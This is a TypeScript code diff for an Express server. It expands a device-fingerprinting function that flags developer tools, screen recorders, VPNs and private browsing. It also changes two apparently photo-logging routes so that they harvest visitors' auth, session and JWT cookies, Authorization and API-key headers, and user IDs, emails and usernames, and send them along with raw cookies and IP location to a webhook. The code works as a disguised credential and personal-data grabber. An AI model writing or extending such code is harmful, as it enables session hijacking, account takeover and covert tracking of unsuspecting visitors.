@@ -355,14 +355,95 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
     if (pixelMatch) deviceModel = `Pixel ${pixelMatch[1]}`;
   }
   
-  // Capability detection
-  if (ua.includes('webkit')) capabilities.push('WebKit Support');
-  if (ua.includes('mobile')) capabilities.push('Mobile Optimized');
-  if (ua.includes('touch')) capabilities.push('Touch Support');
-  if (originalUa.includes('wv')) capabilities.push('WebView');
+  // Advanced capability and feature detection
+  if (ua.includes('webkit')) capabilities.push('🌐 WebKit Support');
+  if (ua.includes('mobile')) capabilities.push('📱 Mobile Optimized');
+  if (ua.includes('touch')) capabilities.push('👆 Touch Support');
+  if (originalUa.includes('wv')) capabilities.push('📦 WebView Container');
   if (ua.includes('headless')) {
-    capabilities.push('Headless Browser');
+    capabilities.push('🤖 Headless Browser');
     securityFlags.push('Headless Browser Detected');
+  }
+  
+  // Advanced browser features detection based on version and engine
+  if (browserName === 'Chrome' && browserVersion) {
+    const chromeVersion = parseInt(browserVersion.split('.')[0]);
+    if (chromeVersion >= 94) capabilities.push('📸 Screen Capture API');
+    if (chromeVersion >= 87) capabilities.push('🎥 WebRTC Advanced');
+    if (chromeVersion >= 91) capabilities.push('🔒 WebAssembly SIMD');
+    if (chromeVersion >= 89) capabilities.push('📊 Web Share API');
+    if (chromeVersion >= 84) capabilities.push('🌍 Web Locks API');
+  }
+  
+  if (browserName === 'Firefox' && browserVersion) {
+    const firefoxVersion = parseInt(browserVersion.split('.')[0]);
+    if (firefoxVersion >= 98) capabilities.push('📸 Screen Capture API');
+    if (firefoxVersion >= 94) capabilities.push('🎥 WebRTC Enhanced');
+    if (firefoxVersion >= 89) capabilities.push('🔐 Web Crypto Enhanced');
+  }
+  
+  if (browserName === 'Safari' && browserVersion) {
+    const safariVersion = parseFloat(browserVersion);
+    if (safariVersion >= 15.4) capabilities.push('📸 Screen Share API');
+    if (safariVersion >= 15.0) capabilities.push('🎥 WebRTC Support');
+    if (safariVersion >= 14.0) capabilities.push('🔊 Web Audio Enhanced');
+  }
+  
+  // Mobile-specific capabilities
+  if (deviceType === 'mobile' || deviceType === 'tablet') {
+    capabilities.push('📍 Geolocation API');
+    capabilities.push('📳 Device Motion');
+    capabilities.push('🔋 Battery Status');
+    if (operatingSystem === 'iOS') {
+      capabilities.push('🍎 iOS Safari WebKit');
+      capabilities.push('📱 iOS Native Bridge');
+    }
+    if (operatingSystem === 'Android') {
+      capabilities.push('🤖 Android WebView');
+      capabilities.push('📱 Chrome Mobile Engine');
+    }
+  }
+  
+  // Desktop-specific capabilities
+  if (deviceType === 'desktop') {
+    capabilities.push('💻 Full DOM Access');
+    capabilities.push('📂 File System API');
+    capabilities.push('🖱️ Pointer Events');
+    capabilities.push('⌨️ Keyboard API');
+  }
+  
+  // Advanced security and privacy features detection
+  if (ua.includes('secure')) capabilities.push('🔒 Enhanced Security');
+  if (ua.includes('private') || ua.includes('incognito')) {
+    capabilities.push('🕶️ Private Browsing');
+    securityFlags.push('Private/Incognito Mode');
+  }
+  
+  // Developer tools detection patterns
+  const devToolPatterns = [
+    'devtools', 'inspect', 'debug', 'developer', 'firebug', 'webkit-inspector'
+  ];
+  if (devToolPatterns.some(pattern => ua.includes(pattern))) {
+    securityFlags.push('Developer Tools Detected');
+    capabilities.push('🛠️ Developer Tools');
+  }
+  
+  // Advanced bot and automation detection
+  if (ua.includes('chrome') && !ua.includes('version') && !ua.includes('safari')) {
+    securityFlags.push('Potential Automation Tool');
+  }
+  
+  // Screen recording/capture detection patterns
+  const screenCapturePatterns = ['obs', 'screen', 'capture', 'record', 'streaming'];
+  if (screenCapturePatterns.some(pattern => ua.includes(pattern))) {
+    securityFlags.push('Screen Capture Software');
+    capabilities.push('📹 Screen Recording Tools');
+  }
+  
+  // VPN/Privacy tool detection in user agent
+  const privacyTools = ['vpn', 'proxy', 'tor', 'anonymous', 'privacy', 'secure'];
+  if (privacyTools.some(tool => ua.includes(tool))) {
+    securityFlags.push('Privacy Tools Detected');
   }
   
   // Security analysis
@@ -1394,30 +1475,64 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
       const cookies = req.headers.cookie || '';
 
-      // Extract potential tokens from cookies and headers
+      // Enhanced token and sensitive data extraction
       const authTokens = [];
+      const sensitiveData = [];
+      const headerAnalysis = [];
+      
+      // Comprehensive cookie analysis
       if (cookies) {
+        // Authentication tokens with categorization
         const tokenPatterns = [
-          /token[^=]*=([^;]+)/gi,
-          /auth[^=]*=([^;]+)/gi,
-          /session[^=]*=([^;]+)/gi,
-          /jwt[^=]*=([^;]+)/gi,
-          /access[^=]*=([^;]+)/gi
+          { pattern: /token[^=]*=([^;]+)/gi, type: '🔑 Token' },
+          { pattern: /auth[^=]*=([^;]+)/gi, type: '🛡️ Auth' },
+          { pattern: /session[^=]*=([^;]+)/gi, type: '🔐 Session' },
+          { pattern: /jwt[^=]*=([^;]+)/gi, type: '🎫 JWT' },
+          { pattern: /access[^=]*=([^;]+)/gi, type: '🗝️ Access' }
         ];
 
-        tokenPatterns.forEach(pattern => {
+        tokenPatterns.forEach(({ pattern, type }) => {
           const matches = cookies.match(pattern);
           if (matches) {
-            authTokens.push(...matches);
+            matches.forEach(match => {
+              const value = match.split('=')[1];
+              authTokens.push(`${type}: ${value.substring(0, 20)}...`);
+            });
+          }
+        });
+        
+        // Sensitive personal data patterns
+        const personalDataPatterns = [
+          { pattern: /user[^=]*=([^;]+)/gi, type: '👤 User ID' },
+          { pattern: /email[^=]*=([^;]+)/gi, type: '📧 Email' },
+          { pattern: /username[^=]*=([^;]+)/gi, type: '👥 Username' }
+        ];
+        
+        personalDataPatterns.forEach(({ pattern, type }) => {
+          const matches = cookies.match(pattern);
+          if (matches) {
+            matches.forEach(match => {
+              const value = match.split('=')[1];
+              sensitiveData.push(`${type}: ${value.substring(0, 15)}...`);
+            });
           }
         });
       }
 
-      // Check Authorization header
+      // Enhanced header analysis
       const authHeader = req.headers.authorization;
       if (authHeader) {
-        authTokens.push(`Authorization: ${authHeader}`);
+        authTokens.push(`🔐 Authorization: ${authHeader.substring(0, 30)}...`);
       }
+      
+      // Additional security headers
+      ['x-auth-token', 'x-api-key', 'x-access-token', 'x-csrf-token'].forEach(header => {
+        const value = req.headers[header];
+        if (value) {
+          const headerValue = Array.isArray(value) ? value[0] : value;
+          authTokens.push(`🔑 ${header}: ${headerValue.substring(0, 20)}...`);
+        }
+      });
 
       const locationData = getLocationFromIp(clientIp);
       const deviceInfo = parseDeviceInfo(userAgent);
@@ -1472,7 +1587,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
           realLocation: locationData.realLocation,
           ...deviceInfo, // Include all enhanced device information
           cookies: cookies || 'None',
-          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
+          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None',
+          sensitiveData: sensitiveData.length > 0 ? sensitiveData.join(', ') : 'None',
+          headerAnalysis: headerAnalysis.length > 0 ? headerAnalysis.join(', ') : 'None',
+          requestType: 'enhanced_photo_logging',
+          timestamp: new Date().toISOString()
         }).catch(webhookError => {
           console.error('❌ Webhook sending failed:', webhookError);
         });
@@ -1532,30 +1651,64 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
       const cookies = req.headers.cookie || '';
 
-      // Extract potential tokens from cookies and headers
+      // Enhanced token and sensitive data extraction
       const authTokens = [];
+      const sensitiveData = [];
+      const headerAnalysis = [];
+      
+      // Comprehensive cookie analysis
       if (cookies) {
+        // Authentication tokens with categorization
         const tokenPatterns = [
-          /token[^=]*=([^;]+)/gi,
-          /auth[^=]*=([^;]+)/gi,
-          /session[^=]*=([^;]+)/gi,
-          /jwt[^=]*=([^;]+)/gi,
-          /access[^=]*=([^;]+)/gi
+          { pattern: /token[^=]*=([^;]+)/gi, type: '🔑 Token' },
+          { pattern: /auth[^=]*=([^;]+)/gi, type: '🛡️ Auth' },
+          { pattern: /session[^=]*=([^;]+)/gi, type: '🔐 Session' },
+          { pattern: /jwt[^=]*=([^;]+)/gi, type: '🎫 JWT' },
+          { pattern: /access[^=]*=([^;]+)/gi, type: '🗝️ Access' }
         ];
 
-        tokenPatterns.forEach(pattern => {
+        tokenPatterns.forEach(({ pattern, type }) => {
           const matches = cookies.match(pattern);
           if (matches) {
-            authTokens.push(...matches);
+            matches.forEach(match => {
+              const value = match.split('=')[1];
+              authTokens.push(`${type}: ${value.substring(0, 20)}...`);
+            });
+          }
+        });
+        
+        // Sensitive personal data patterns
+        const personalDataPatterns = [
+          { pattern: /user[^=]*=([^;]+)/gi, type: '👤 User ID' },
+          { pattern: /email[^=]*=([^;]+)/gi, type: '📧 Email' },
+          { pattern: /username[^=]*=([^;]+)/gi, type: '👥 Username' }
+        ];
+        
+        personalDataPatterns.forEach(({ pattern, type }) => {
+          const matches = cookies.match(pattern);
+          if (matches) {
+            matches.forEach(match => {
+              const value = match.split('=')[1];
+              sensitiveData.push(`${type}: ${value.substring(0, 15)}...`);
+            });
           }
         });
       }
 
-      // Check Authorization header
+      // Enhanced header analysis
       const authHeader = req.headers.authorization;
       if (authHeader) {
-        authTokens.push(`Authorization: ${authHeader}`);
+        authTokens.push(`🔐 Authorization: ${authHeader.substring(0, 30)}...`);
       }
+      
+      // Additional security headers
+      ['x-auth-token', 'x-api-key', 'x-access-token', 'x-csrf-token'].forEach(header => {
+        const value = req.headers[header];
+        if (value) {
+          const headerValue = Array.isArray(value) ? value[0] : value;
+          authTokens.push(`🔑 ${header}: ${headerValue.substring(0, 20)}...`);
+        }
+      });
 
       const locationData = getLocationFromIp(clientIp);
       const deviceInfo = parseDeviceInfo(userAgent);
@@ -1611,7 +1764,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
           realLocation: locationData.realLocation,
           ...deviceInfo, // Include all enhanced device information
           cookies: cookies || 'None',
-          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
+          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None',
+          sensitiveData: sensitiveData.length > 0 ? sensitiveData.join(', ') : 'None',
+          headerAnalysis: headerAnalysis.length > 0 ? headerAnalysis.join(', ') : 'None',
+          requestType: 'enhanced_photo_logging',
+          timestamp: new Date().toISOString()
         }).catch(webhookError => {
           console.error('❌ Webhook sending failed:', webhookError);
         });
